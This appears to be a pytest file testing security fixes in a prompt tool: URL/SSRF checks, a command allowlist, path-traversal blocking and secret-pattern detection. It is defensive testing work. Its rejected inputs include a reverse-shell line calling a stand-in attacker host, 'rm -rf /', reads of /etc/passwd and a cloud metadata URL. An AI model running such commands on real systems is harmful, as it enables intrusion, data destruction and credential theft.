"""Tests for the security fixes introduced in the security hardening pass.

Covers:
  - VULN-001: shell=True removal / command allowlist (_validate_cmd_allowed)
  - VULN-002: SSRF / URL scheme validation (_check_url_allowed)
  - VULN-002: Path traversal protection in _gather_file
  - VULN-003: Secrets gate hard-block (run_engine._check_secrets_gate +
              _run_spec_async raising EXIT_SECRETS)
  - Priority-1: Safe file I/O (already covered by test_fileio.py — duplicates
                omitted, only new surface tested)
"""

from __future__ import annotations

import pytest

from promptgenie.core.context_builder import (
    SecurityError,
    _check_url_allowed,
    _validate_cmd_allowed,
)
from promptgenie.core.errors import EXIT_SECRETS, EXIT_USAGE, PromptGenieError
from promptgenie.core.run_engine import _check_secrets_gate


# ---------------------------------------------------------------------------
# VULN-002: URL scheme / SSRF validation
# ---------------------------------------------------------------------------


class TestCheckUrlAllowed:
    """_check_url_allowed must raise SecurityError for disallowed schemes and IPs."""

    def test_https_allowed(self):
        # Should not raise
        _check_url_allowed("https://example.com/data.txt")

    def test_http_allowed(self):
        _check_url_allowed("http://example.com/data.txt")

    def test_file_scheme_blocked(self):
        with pytest.raises(SecurityError, match="file"):
            _check_url_allowed("file:///etc/passwd")

    def test_ftp_scheme_blocked(self):
        with pytest.raises(SecurityError, match="ftp"):
            _check_url_allowed("ftp://example.com/file")

    def test_data_scheme_blocked(self):
        with pytest.raises(SecurityError, match="data"):
            _check_url_allowed("data:text/plain;base64,dGVzdA==")

    def test_loopback_ipv4_blocked(self):
        with pytest.raises(SecurityError, match="internal"):
            _check_url_allowed("http://127.0.0.1/admin")

    def test_loopback_ipv4_variant_blocked(self):
        with pytest.raises(SecurityError, match="internal"):
            _check_url_allowed("https://127.255.255.255/secret")

    def test_private_10x_blocked(self):
        with pytest.raises(SecurityError, match="internal"):
            _check_url_allowed("http://10.0.0.1/internal-api")

    def test_private_172_16_blocked(self):
        with pytest.raises(SecurityError, match="internal"):
            _check_url_allowed("http://172.16.0.1/data")

    def test_private_172_31_blocked(self):
        with pytest.raises(SecurityError, match="internal"):
            _check_url_allowed("http://172.31.255.255/data")

    def test_private_192_168_blocked(self):
        with pytest.raises(SecurityError, match="internal"):
            _check_url_allowed("http://192.168.1.100/config")

    def test_link_local_blocked(self):
        with pytest.raises(SecurityError, match="internal"):
            _check_url_allowed("http://169.254.169.254/latest/meta-data/")

    def test_ipv6_loopback_blocked(self):
        with pytest.raises(SecurityError, match="internal"):
            _check_url_allowed("http://[::1]/admin")

    def test_hostname_not_blocked_by_ip_check(self):
        # Hostname-based URLs pass the static check (DNS resolution not done here)
        _check_url_allowed("https://api.github.com/repos")

    def test_empty_scheme_blocked(self):
        with pytest.raises(SecurityError):
            _check_url_allowed("//no-scheme.com/path")


# ---------------------------------------------------------------------------
# VULN-001: Command allowlist / shell=True removal
# ---------------------------------------------------------------------------


class TestValidateCmdAllowed:
    """_validate_cmd_allowed must parse safely and reject disallowed executables."""

    def test_allowed_git_command(self):
        argv = _validate_cmd_allowed("git log --oneline -10")
        assert argv[0] == "git"
        assert argv[1] == "log"

    def test_allowed_echo_command(self):
        argv = _validate_cmd_allowed("echo hello world")
        assert argv == ["echo", "hello", "world"]

    def test_allowed_python_command(self):
        argv = _validate_cmd_allowed("python3 -c 'print(1)'")
        assert argv[0] == "python3"

    def test_disallowed_rm_blocked(self):
        with pytest.raises(SecurityError, match="allowed"):
            _validate_cmd_allowed("rm -rf /")

    def test_disallowed_curl_blocked(self):
        with pytest.raises(SecurityError, match="allowed"):
            _validate_cmd_allowed("curl http://example.com")

    def test_disallowed_bash_blocked(self):
        with pytest.raises(SecurityError, match="allowed"):
            _validate_cmd_allowed("bash -c 'cat /etc/passwd'")

    def test_disallowed_sh_blocked(self):
        with pytest.raises(SecurityError, match="allowed"):
            _validate_cmd_allowed("sh exploit.sh")

    def test_disallowed_nc_blocked(self):
        with pytest.raises(SecurityError, match="allowed"):
            _validate_cmd_allowed("nc -e /bin/sh attacker.com 4444")

    def test_path_prefix_stripped(self):
        # /usr/bin/rm should still be blocked because the executable name is 'rm'
        with pytest.raises(SecurityError, match="allowed"):
            _validate_cmd_allowed("/usr/bin/rm -rf /tmp/something")

    def test_empty_command_raises(self):
        with pytest.raises(SecurityError, match="[Ee]mpty"):
            _validate_cmd_allowed("")

    def test_invalid_shell_syntax_raises(self):
        with pytest.raises(SecurityError):
            _validate_cmd_allowed("echo 'unclosed quote")

    def test_returns_list(self):
        result = _validate_cmd_allowed("git status --short")
        assert isinstance(result, list)
        assert len(result) == 3


# ---------------------------------------------------------------------------
# VULN-002: Path traversal protection in _gather_file
# ---------------------------------------------------------------------------


class TestPathTraversalProtection:
    """_gather_file must refuse to read files outside base_dir."""

    def test_traversal_blocked(self, tmp_path):
        from promptgenie.core.context_builder import _gather_file

        # Create a valid base_dir with a subdirectory
        project_dir = tmp_path / "project"
        project_dir.mkdir()
        outside_file = tmp_path / "secret.txt"
        outside_file.write_text("TOP SECRET", encoding="utf-8")

        with pytest.raises(SecurityError, match="outside"):
            _gather_file("../secret.txt", "", 0, project_dir, [])

    def test_legitimate_file_within_base_allowed(self, tmp_path):
        from promptgenie.core.context_builder import _gather_file

        project_dir = tmp_path / "project"
        project_dir.mkdir()
        target = project_dir / "README.md"
        target.write_text("# Hello", encoding="utf-8")

        entry = _gather_file("README.md", "", 0, project_dir, [])
        assert entry is not None
        assert entry.content == "# Hello"

    def test_absolute_path_outside_base_blocked(self, tmp_path):
        from promptgenie.core.context_builder import _gather_file

        project_dir = tmp_path / "project"
        project_dir.mkdir()
        outside_file = tmp_path / "outside.txt"
        outside_file.write_text("should not read", encoding="utf-8")

        with pytest.raises(SecurityError, match="outside"):
            _gather_file(str(outside_file), "", 0, project_dir, [])

    def test_symlink_traversal_blocked(self, tmp_path):
        """A symlink inside base_dir that points outside must be blocked."""
        import os

        from promptgenie.core.context_builder import _gather_file

        project_dir = tmp_path / "project"
        project_dir.mkdir()
        outside_file = tmp_path / "sensitive.txt"
        outside_file.write_text("sensitive data", encoding="utf-8")
        link = project_dir / "link_to_outside.txt"
        os.symlink(outside_file, link)

        with pytest.raises(SecurityError, match="outside"):
            _gather_file("link_to_outside.txt", "", 0, project_dir, [])


# ---------------------------------------------------------------------------
# VULN-003: Secrets gate — hard block
# ---------------------------------------------------------------------------


class TestSecretsGateHardBlock:
    """The secrets gate must return findings for known secret patterns."""

    def test_openai_key_detected(self):
        prompt = "Use this key: sk-abcdefghijklmnopqrstuvwxyz123456"
        warnings = _check_secrets_gate(prompt)
        assert len(warnings) > 0

    def test_aws_access_key_detected(self):
        prompt = "Access key: AKIAIOSFODNN7EXAMPLE"
        warnings = _check_secrets_gate(prompt)
        assert len(warnings) > 0

    def test_github_pat_detected(self):
        prompt = "Token: ghp_" + "A" * 36
        warnings = _check_secrets_gate(prompt)
        assert len(warnings) > 0

    def test_clean_prompt_no_findings(self):
        prompt = "Please summarize the following document and list the key points."
        warnings = _check_secrets_gate(prompt)
        assert warnings == []

    def test_private_key_detected(self):
        prompt = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA..."
        warnings = _check_secrets_gate(prompt)
        assert len(warnings) > 0


class TestRunEngineSecretsBlock:
    """run_spec must raise EXIT_SECRETS when secrets found (unless allow_secrets=True)."""

    def _make_spec(self, tmp_path):
        from promptgenie.core.spec import PromptSpec, RunOptions, OutputContract

        spec = PromptSpec(
            version=1,
            name="test",
            target="claude-code",
            prompt="Use this OpenAI key: sk-" + "x" * 40,
            run=RunOptions(dry_run=False, stream=False),
            output_contract=OutputContract(),
        )
        spec._source_path = tmp_path / "test.yaml"
        return spec

    def test_secrets_gate_raises_exit_secrets(self, tmp_path):
        from promptgenie.core.run_engine import run_spec

        spec = self._make_spec(tmp_path)
        with pytest.raises((PromptGenieError, SystemExit)) as exc_info:
            run_spec(spec, no_input=True, dry_run=True)
        # With dry_run=True, secrets gate fires before provider call
        # The check runs on the assembled prompt which includes the secret
        exc = exc_info.value
        if isinstance(exc, PromptGenieError):
            assert exc.code == EXIT_SECRETS
        # SystemExit(6) is also acceptable from handle_error path

    def test_dry_run_with_allow_secrets_does_not_raise(self, tmp_path):
        """allow_secrets=True should emit warnings but not block."""
        from promptgenie.core.run_engine import run_spec

        spec = self._make_spec(tmp_path)
        # Should complete (dry_run, no provider call) without raising
        result = run_spec(spec, no_input=True, dry_run=True, allow_secrets=True)
        assert result.dry_run is True
        # Warnings should have been emitted as events
        warning_events = [e for e in result.events if e.event == "warning"]
        assert len(warning_events) > 0


# ---------------------------------------------------------------------------
# SecurityError is a PromptGenieError subclass
# ---------------------------------------------------------------------------


class TestSecurityErrorSubclass:
    def test_security_error_is_promptgenie_error(self):
        err = SecurityError("blocked", code=EXIT_USAGE)
        assert isinstance(err, PromptGenieError)
        assert err.code == EXIT_USAGE
